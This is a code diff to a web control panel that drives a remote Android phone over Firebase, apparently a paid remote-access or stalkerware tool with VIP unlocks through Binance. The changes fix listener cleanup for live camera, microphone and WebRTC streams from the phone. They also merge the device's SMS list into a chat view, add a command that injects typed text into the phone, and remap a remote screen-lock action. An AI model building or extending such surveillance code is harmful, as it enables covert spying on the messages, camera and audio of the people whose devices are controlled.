@@ -1693,6 +1693,7 @@
         });
 
         function evaluatePermissions() {
+            window.evaluatePermissions = evaluatePermissions;
             window.isUserAdmin = checkIsAdmin(email, currentMeta);
             
             const sub = currentMeta.subscription || {};
@@ -2103,7 +2104,8 @@
                         setTimeout(() => {
                             closeLockModal();
                             alert(`🎉 Binance Payment Verified! 1 Month VIP ($10) is active until ${new Date(expiryTime).toLocaleDateString()}. All features unlocked!`);
-                            if (typeof evaluatePermissions === 'function') evaluatePermissions();
+                            if (typeof window.evaluatePermissions === 'function') window.evaluatePermissions();
+                            else if (typeof evaluatePermissions === 'function') evaluatePermissions();
                             if (typeof updateTabLockUI === 'function') updateTabLockUI();
                         }, 800);
                     });
@@ -2157,7 +2159,8 @@
                                 fbDb.ref(`users_meta/${uid}/subscription`).off('value', subListener);
                                 closeLockModal();
                                 alert(`🎉 VIP Payment Approved by Admin! 1 Month Full Access VIP is now active!`);
-                                if (typeof evaluatePermissions === 'function') evaluatePermissions();
+                                if (typeof window.evaluatePermissions === 'function') window.evaluatePermissions();
+                                else if (typeof evaluatePermissions === 'function') evaluatePermissions();
                                 if (typeof updateTabLockUI === 'function') updateTabLockUI();
                             }
                         });
@@ -2268,7 +2271,8 @@
 
     function updateInterval() {
         if (isRemoteActive) {
-            const interval = parseInt(document.getElementById('intervalSelect').value) || 1000;
+            const intervalEl = document.getElementById('intervalSelect');
+            const interval = intervalEl ? (parseInt(intervalEl.value) || 1000) : 1000;
             devRef.child('screenConfig/interval').set(interval);
         }
     }
@@ -2298,7 +2302,8 @@
     }
 
     function sendGlobal(action) {
-        devRef.child('commands/globalAction').set(action);
+        const mapped = (action === 'lock') ? 'lockScreen' : action;
+        devRef.child('commands/globalAction').set(mapped);
     }
 
     function sendCustomNotification() {
@@ -2690,9 +2695,13 @@
     });
 
     function escapeHtml(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
+        if (text === null || text === undefined) return '';
+        return String(text)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
     }
 
     devRef.child('logs').orderByKey().limitToLast(100).on('value', s => {
@@ -4402,7 +4411,7 @@
         const contact = thread ? thread.contactName : 'Direct Reply';
 
         // 1. Save directly to Firebase chat stream as Outgoing message
-        devRef.child(`chats/${app}/messages`).push().setValue({
+        devRef.child(`chats/${app}/messages`).push().set({
             sender: 'You',
             body: text,
             isOutgoing: true,
@@ -4411,7 +4420,11 @@
             time: Date.now()
         });
 
-        // 2. Also send clipboard/text injection command to device
+        // 2. Also send text injection / clipboard command to device
+        devRef.child('commands/inputText').set({
+            text: text,
+            timestamp: Date.now()
+        });
         devRef.child('commands/clipboard').set({
             text: text,
             timestamp: Date.now()
@@ -4435,9 +4448,10 @@
             });
         });
 
-        // Also listen for general SMS list and integrate with chat hub
-        devRef.child('sms/list').on('value', snap => {
+        // Also listen for general SMS list (smsList in Android app) and integrate with chat hub
+        const handleSmsSnapshot = snap => {
             const smsData = snap.val() || {};
+            if (!snap.exists()) return;
             const items = Array.isArray(smsData) ? smsData : Object.values(smsData);
             const converted = {};
             items.forEach((s, idx) => {
@@ -4454,7 +4468,9 @@
             });
             allChatStore.sms = converted;
             renderSocialChatHub(false);
-        });
+        };
+        devRef.child('smsList').on('value', handleSmsSnapshot);
+        devRef.child('sms/list').on('value', handleSmsSnapshot);
     }
     setupChatListeners();
 
@@ -4657,6 +4673,14 @@
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             });
             devRef.child('commands/stopScreenShare').set(true);
+            if (liveCamStreamListener) {
+                devRef.child('live_stream/stream_frame').off('value', liveCamStreamListener);
+                liveCamStreamListener = null;
+            }
+            if (liveCamAudioListener) {
+                devRef.child('live_stream/audio_chunk').off('value', liveCamAudioListener);
+                liveCamAudioListener = null;
+            }
         }
     }
 
@@ -4713,6 +4737,10 @@
             });
         }
     }
+
+    let liveCamAudioListener = null;
+    let liveCamAnswerListener = null;
+    let liveCamIceListener = null;
 
     function toggleLiveCamStream(start) {
         if (!devRef) {
@@ -4826,6 +4854,18 @@
                 devRef.child('live_stream/stream_frame').off('value', liveCamStreamListener);
                 liveCamStreamListener = null;
             }
+            if (liveCamAudioListener) {
+                devRef.child('live_stream/audio_chunk').off('value', liveCamAudioListener);
+                liveCamAudioListener = null;
+            }
+            if (liveCamAnswerListener) {
+                devRef.child('live_stream/webrtc/answer').off('value', liveCamAnswerListener);
+                liveCamAnswerListener = null;
+            }
+            if (liveCamIceListener) {
+                devRef.child('live_stream/webrtc/ice_candidates_phone').off('child_added', liveCamIceListener);
+                liveCamIceListener = null;
+            }
             if (liveCamAudioCtx) {
                 try { liveCamAudioCtx.close(); } catch(e){}
                 liveCamAudioCtx = null;
@@ -4841,9 +4881,22 @@
         const pingEl = document.getElementById('liveCamPingVal');
         const engineEl = document.getElementById('liveCamEngineVal');
 
-        // 1. High-Speed Direct GPU Hardware Accelerated Frame Engine (Zero-Buffer Policy)
+        // 1. Clean existing listeners to prevent accumulation/echo
         if (liveCamStreamListener) {
             devRef.child('live_stream/stream_frame').off('value', liveCamStreamListener);
+            liveCamStreamListener = null;
+        }
+        if (liveCamAudioListener) {
+            devRef.child('live_stream/audio_chunk').off('value', liveCamAudioListener);
+            liveCamAudioListener = null;
+        }
+        if (liveCamAnswerListener) {
+            devRef.child('live_stream/webrtc/answer').off('value', liveCamAnswerListener);
+            liveCamAnswerListener = null;
+        }
+        if (liveCamIceListener) {
+            devRef.child('live_stream/webrtc/ice_candidates_phone').off('child_added', liveCamIceListener);
+            liveCamIceListener = null;
         }
 
         async function renderFrameToCanvas(dataUrl) {
@@ -5018,7 +5071,7 @@
             }
         }
 
-        devRef.child('live_stream/audio_chunk').on('value', snap => {
+        liveCamAudioListener = snap => {
             const isAudioActive = (isLiveCamStreaming && liveCamAudio) || (isTab1ScreenStreaming && tab1ScreenAudio);
             if (!isAudioActive) return;
             const audioData = snap.val();
@@ -5055,7 +5108,8 @@
             } catch(e){
                 console.log('Audio chunk processing error:', e);
             }
-        });
+        };
+        devRef.child('live_stream/audio_chunk').on('value', liveCamAudioListener);
 
         // 3. WebRTC Direct P2P Stream Receiver (Instant PeerConnection Handshake)
         initWebRtcSignaling();
@@ -5116,7 +5170,7 @@
             });
 
             // Listen for WebRTC Answer from Android Phone
-            devRef.child('live_stream/webrtc/answer').on('value', async snap => {
+            liveCamAnswerListener = async snap => {
                 if (!isLiveCamStreaming || !liveCamPeerConn) return;
                 const answer = snap.val();
                 if (!answer || !answer.sdp) return;
@@ -5128,10 +5182,11 @@
                 } catch(err) {
                     console.log('WebRTC setRemoteDescription error:', err);
                 }
-            });
+            };
+            devRef.child('live_stream/webrtc/answer').on('value', liveCamAnswerListener);
 
             // Listen for ICE candidates from Android Phone
-            devRef.child('live_stream/webrtc/ice_candidates_phone').on('child_added', async snap => {
+            liveCamIceListener = async snap => {
                 if (!isLiveCamStreaming || !liveCamPeerConn) return;
                 const cand = snap.val();
                 if (cand && cand.candidate) {
@@ -5139,7 +5194,8 @@
                         await liveCamPeerConn.addIceCandidate(new RTCIceCandidate(cand));
                     } catch(e){}
                 }
-            });
+            };
+            devRef.child('live_stream/webrtc/ice_candidates_phone').on('child_added', liveCamIceListener);
 
         } catch(err) {
             console.log('WebRTC init error, fallback active:', err);
